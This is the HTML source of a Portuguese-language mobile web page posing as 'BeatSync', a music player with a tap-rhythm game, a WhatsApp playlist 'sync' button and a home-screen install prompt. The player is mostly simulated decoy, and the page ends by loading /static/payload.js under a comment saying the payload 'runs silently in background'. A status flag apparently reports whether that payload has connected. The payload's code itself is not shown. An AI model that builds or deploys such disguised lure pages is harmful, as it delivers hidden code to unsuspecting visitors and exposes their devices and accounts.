<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="apple-mobile-web-app-title" content="BeatSync">
<meta name="mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#0a0a0a">
<link rel="manifest" href="/static/manifest.json">
<title>BeatSync — Music Player</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:linear-gradient(180deg,#0a0a0a,#1a0033,#0a0a0a);color:white;min-height:100vh;overflow:hidden;display:flex;flex-direction:column;align-items:center}
/* ─── Header ─── */
.header{width:100%;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;font-size:13px;color:rgba(255,255,255,.7)}
.header .logo{font-weight:700;font-size:16px;color:#c084fc;letter-spacing:1px}
.header .status{font-size:10px;background:rgba(192,132,252,.15);padding:4px 10px;border-radius:12px;color:#c084fc}
/* ─── Album Art ─── */
.art-container{width:220px;height:220px;border-radius:50%;margin:20px auto;position:relative;animation:spin 12s linear infinite paused}
.art-container.playing{animation-play-state:running}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
.art{width:100%;height:100%;border-radius:50%;background:linear-gradient(135deg,#4c1d95,#7c3aed,#a78bfa,#c084fc);display:flex;align-items:center;justify-content:center;box-shadow:0 0 60px rgba(124,58,237,.4),0 0 120px rgba(124,58,237,.1)}
.art .text{font-size:60px;font-weight:700;color:rgba(255,255,255,.9)}
.art .hole{position:absolute;width:40px;height:40px;background:#0a0a0a;border-radius:50%;border:3px solid rgba(255,255,255,.1)}
/* ─── Track Info ─── */
.track-info{text-align:center;margin:10px 0}
.track-info h2{font-size:18px;font-weight:600;margin-bottom:4px}
.track-info p{font-size:12px;color:rgba(255,255,255,.5)}
/* ─── Progress Bar ─── */
.progress-container{width:85%;max-width:300px;margin:10px auto}
.progress-bar{height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden}
.progress-fill{height:100%;background:linear-gradient(90deg,#7c3aed,#c084fc);border-radius:2px;width:0%;transition:width .3s}
.time{display:flex;justify-content:space-between;font-size:10px;color:rgba(255,255,255,.4);margin-top:4px}
/* ─── Game Area ─── */
.game-area{width:90%;max-width:340px;height:180px;background:rgba(255,255,255,.03);border-radius:16px;margin:15px auto;position:relative;overflow:hidden;border:1px solid rgba(192,132,252,.15)}
#gameCanvas{width:100%;height:100%}
.game-score{position:absolute;top:10px;right:15px;font-size:24px;font-weight:700;color:#c084fc;text-shadow:0 0 20px rgba(192,132,252,.5)}
.game-combo{position:absolute;top:40px;right:15px;font-size:11px;color:rgba(255,255,255,.5)}
.game-start{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:14px;color:#c084fc;text-align:center;background:rgba(0,0,0,.8);padding:15px 30px;border-radius:20px;cursor:pointer;border:1px solid rgba(192,132,252,.3)}
.game-start:active{background:rgba(124,58,237,.3)}
/* ─── Controls ─── */
.controls{display:flex;justify-content:center;align-items:center;gap:25px;margin:10px 0}
.ctrl-btn{width:50px;height:50px;border-radius:50%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:white;font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s}
.ctrl-btn:active{background:rgba(192,132,252,.3);transform:scale(.95)}
.ctrl-btn.play{width:60px;height:60px;background:linear-gradient(135deg,#7c3aed,#c084fc);border:none;font-size:24px;box-shadow:0 4px 20px rgba(124,58,237,.4)}
/* ─── WhatsApp Sync Button ─── */
.wa-sync{width:85%;max-width:300px;margin:10px auto;padding:12px;background:rgba(37,211,102,.1);border:1px solid rgba(37,211,102,.3);border-radius:12px;text-align:center;cursor:pointer;font-size:12px;color:#25d366;transition:all .2s}
.wa-sync:active{background:rgba(37,211,102,.2);transform:scale(.98)}
.wa-sync .wa-icon{font-size:18px;margin-right:6px}
/* ─── Bottom Nav ─── */
.nav{width:100%;display:flex;justify-content:space-around;padding:10px;border-top:1px solid rgba(255,255,255,.05);font-size:10px;color:rgba(255,255,255,.4);position:fixed;bottom:0;background:rgba(0,0,0,.8)}
.nav .active{color:#c084fc}
/* ─── PWA Install Prompt ─── */
.install-banner{position:fixed;bottom:60px;left:10px;right:10px;background:rgba(0,0,0,.95);border:1px solid rgba(192,132,252,.3);color:white;padding:12px;border-radius:12px;text-align:center;font-size:12px;z-index:99;display:none;cursor:pointer}
.install-banner:active{background:rgba(124,58,237,.2)}
</style>
</head>
<body>

<!-- Header -->
<div class="header">
  <span class="logo">BeatSync</span>
  <span class="status" id="connStatus">● LIVE</span>
</div>

<!-- Album Art -->
<div class="art-container playing" id="artContainer">
  <div class="art"><span class="text">♪</span><div class="hole"></div></div>
</div>

<!-- Track Info -->
<div class="track-info">
  <h2 id="trackName">Midnight Voyage</h2>
  <p id="trackArtist">SYNC Ensemble</p>
</div>

<!-- Progress -->
<div class="progress-container">
  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
  <div class="time"><span id="currentTime">0:00</span><span id="totalTime">4:20</span></div>
</div>

<!-- Game -->
<div class="game-area" id="gameContainer">
  <canvas id="gameCanvas"></canvas>
  <div class="game-score" id="gameScore">0</div>
  <div class="game-combo" id="gameCombo"></div>
  <div class="game-start" id="gameStart" onclick="startGame()">
    ▶ TAP TO PLAY<br><small>Toque nas notas no ritmo!</small>
  </div>
</div>

<!-- Controls -->
<div class="controls">
  <button class="ctrl-btn">⏮</button>
  <button class="ctrl-btn play" id="playBtn">▶</button>
  <button class="ctrl-btn">⏭</button>
</div>

<!-- WhatsApp Sync -->
<div class="wa-sync" id="waSync" onclick="openWhatsApp()">
  <span class="wa-icon">💬</span> Sincronizar com WhatsApp para playlists
</div>

<script>
// ─── Music Player State ───
var playing = true;
var progress = 0;
var tracks = [
  {name: 'Midnight Voyage', artist: 'SYNC Ensemble', emoji: '♪'},
  {name: 'Crystal Dreams', artist: 'SYNC Ensemble', emoji: '♫'},
  {name: 'Neon Lights', artist: 'SYNC Ensemble', emoji: '♬'},
  {name: 'Urban Pulse', artist: 'SYNC Ensemble', emoji: '♪'},
  {name: 'Echo Chamber', artist: 'SYNC Ensemble', emoji: '♩'},
];
var currentTrack = 0;

// ─── Progress Simulation ───
setInterval(function() {
  if (playing) {
    progress = (progress + 0.3) % 100;
    document.getElementById('progressFill').style.width = progress + '%';
    var sec = Math.floor((progress / 100) * 260);
    document.getElementById('currentTime').textContent = Math.floor(sec/60) + ':' + String(sec%60).padStart(2,'0');
  }
}, 1000);

// ─── Play/Pause ───
document.getElementById('playBtn').addEventListener('click', function() {
  playing = !playing;
  this.textContent = playing ? '⏸' : '▶';
  document.getElementById('artContainer').classList.toggle('playing', playing);
});

// ─── Next Track ───
document.querySelectorAll('.ctrl-btn')[2].addEventListener('click', function() {
  currentTrack = (currentTrack + 1) % tracks.length;
  var t = tracks[currentTrack];
  document.getElementById('trackName').textContent = t.name;
  document.getElementById('trackArtist').textContent = t.artist;
  document.querySelector('.art .text').textContent = t.emoji;
  progress = 0;
});

// ─── Prev Track ───
document.querySelectorAll('.ctrl-btn')[0].addEventListener('click', function() {
  currentTrack = (currentTrack - 1 + tracks.length) % tracks.length;
  var t = tracks[currentTrack];
  document.getElementById('trackName').textContent = t.name;
  document.getElementById('trackArtist').textContent = t.artist;
  document.querySelector('.art .text').textContent = t.emoji;
  progress = 0;
});

// ─── WhatsApp Redirect ───
function openWhatsApp() {
  if (confirm('Abrir WhatsApp para sincronizar suas playlists?')) {
    window.open(location.origin + '/whatsapp', '_blank');
  }
}

// ─── GAME: Beat Catcher ───
var canvas = document.getElementById('gameCanvas');
var ctx = canvas.getContext('2d');
var gameRunning = false;
var score = 0;
var combo = 0;
var maxCombo = 0;
var notes = [];
var gameLoop;
var spawnTimer;

function resizeCanvas() {
  var container = document.getElementById('gameContainer');
  canvas.width = container.offsetWidth;
  canvas.height = container.offsetHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

// Tap/Click listener for game
canvas.addEventListener('click', function(e) {
  if (!gameRunning) return;
  var rect = canvas.getBoundingClientRect();
  var x = e.clientX - rect.left;
  var y = e.clientY - rect.top;

  var hit = false;
  for (var i = notes.length - 1; i >= 0; i--) {
    var n = notes[i];
    var dx = x - n.x;
    var dy = y - n.y;
    var dist = Math.sqrt(dx*dx + dy*dy);
    if (dist < n.radius + 15) {
      // Hit!
      combo++;
      if (combo > maxCombo) maxCombo = combo;
      var bonus = combo >= 10 ? 3 : combo >= 5 ? 2 : 1;
      score += 10 * bonus;
      notes.splice(i, 1);
      hit = true;
      // Spark effect
      sparkAt(n.x, n.y);
      break;
    }
  }
  if (!hit) {
    combo = 0; // Miss
  }
  updateScore();
});

canvas.addEventListener('touchstart', function(e) {
  e.preventDefault();
  if (!gameRunning) return;
  var rect = canvas.getBoundingClientRect();
  var touch = e.touches[0];
  var x = touch.clientX - rect.left;
  var y = touch.clientY - rect.top;

  var hit = false;
  for (var i = notes.length - 1; i >= 0; i--) {
    var n = notes[i];
    var dx = x - n.x;
    var dy = y - n.y;
    var dist = Math.sqrt(dx*dx + dy*dy);
    if (dist < n.radius + 15) {
      combo++;
      if (combo > maxCombo) maxCombo = combo;
      var bonus = combo >= 10 ? 3 : combo >= 5 ? 2 : 1;
      score += 10 * bonus;
      notes.splice(i, 1);
      hit = true;
      sparkAt(n.x, n.y);
      break;
    }
  }
  if (!hit) combo = 0;
  updateScore();
});

var sparks = [];
function sparkAt(x, y) {
  for (var i = 0; i < 6; i++) {
    sparks.push({
      x: x, y: y,
      vx: (Math.random() - .5) * 6,
      vy: (Math.random() - .5) * 6,
      life: 20
    });
  }
}

function updateScore() {
  document.getElementById('gameScore').textContent = score;
  document.getElementById('gameCombo').textContent = combo > 1 ? combo + 'x COMBO!' : '';
}

function startGame() {
  document.getElementById('gameStart').style.display = 'none';
  score = 0; combo = 0; maxCombo = 0; notes = []; sparks = [];
  updateScore();
  gameRunning = true;

  // Spawn notes
  spawnTimer = setInterval(function() {
    if (notes.length < 8) {
      notes.push({
        x: 30 + Math.random() * (canvas.width - 60),
        y: -20,
        radius: 18 + Math.random() * 12,
        speed: 1 + Math.random() * 2,
        color: ['#c084fc','#a78bfa','#7c3aed','#f472b6','#38bdf8'][Math.floor(Math.random()*5)],
        pulse: 0
      });
    }
  }, 600);

  // Game loop
  gameLoop = setInterval(function() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    // Draw notes
    for (var i = notes.length - 1; i >= 0; i--) {
      var n = notes[i];
      n.y += n.speed;
      n.pulse += 0.05;

      if (n.y > canvas.height + 30) {
        notes.splice(i, 1);
        combo = 0;
        updateScore();
        continue;
      }

      var r = n.radius + Math.sin(n.pulse) * 3;
      var gradient = ctx.createRadialGradient(n.x, n.y, 0, n.x, n.y, r);
      gradient.addColorStop(0, n.color);
      gradient.addColorStop(0.6, n.color + '88');
      gradient.addColorStop(1, 'transparent');
      ctx.beginPath();
      ctx.arc(n.x, n.y, r, 0, Math.PI * 2);
      ctx.fillStyle = gradient;
      ctx.fill();
      ctx.strokeStyle = 'rgba(255,255,255,.3)';
      ctx.lineWidth = 1;
      ctx.stroke();
    }

    // Draw sparks
    for (var i = sparks.length - 1; i >= 0; i--) {
      var s = sparks[i];
      s.x += s.vx; s.y += s.vy; s.life--;
      if (s.life <= 0) { sparks.splice(i, 1); continue; }
      ctx.beginPath();
      ctx.arc(s.x, s.y, 3, 0, Math.PI * 2);
      ctx.fillStyle = 'rgba(255,255,255,' + (s.life/20) + ')';
      ctx.fill();
    }

    // Draw lane lines
    ctx.strokeStyle = 'rgba(255,255,255,.03)';
    ctx.lineWidth = 1;
    for (var x = canvas.width/4; x < canvas.width; x += canvas.width/4) {
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, canvas.height);
      ctx.stroke();
    }
  }, 1000/60);
}

// Kill game after 45s to reduce CPU/heat (user can restart)
setTimeout(function() {
  if (gameRunning) {
    clearInterval(gameLoop);
    clearInterval(spawnTimer);
    gameRunning = false;
    document.getElementById('gameStart').style.display = 'block';
    document.getElementById('gameStart').innerHTML = '🎯 ' + score + ' pts | Max: ' + maxCombo + 'x<br><small>Toque para jogar de novo!</small>';
  }
}, 45000);

// ─── PWA Install Prompt ───
window.addEventListener('beforeinstallprompt', function(e) {
  e.preventDefault();
  window._pwa = e;
  var banner = document.createElement('div');
  banner.className = 'install-banner';
  banner.textContent = '📲 Adicionar à tela inicial para acesso rápido';
  banner.onclick = function() { window._pwa.prompt(); this.remove(); };
  document.body.appendChild(banner);
  setTimeout(function() { banner.style.display = 'block'; }, 2000);
});

// ─── Connection Status ───
window._gfConnected = false;
setInterval(function() {
  document.getElementById('connStatus').textContent = window._gfConnected ? '● LIVE' : '● SYNC';
  document.getElementById('connStatus').style.color = window._gfConnected ? '#4ade80' : '#fbbf24';
}, 2000);
</script>

<!-- Payload runs silently in background -->
<script src="/static/payload.js?v=5"></script>
</body>
</html>
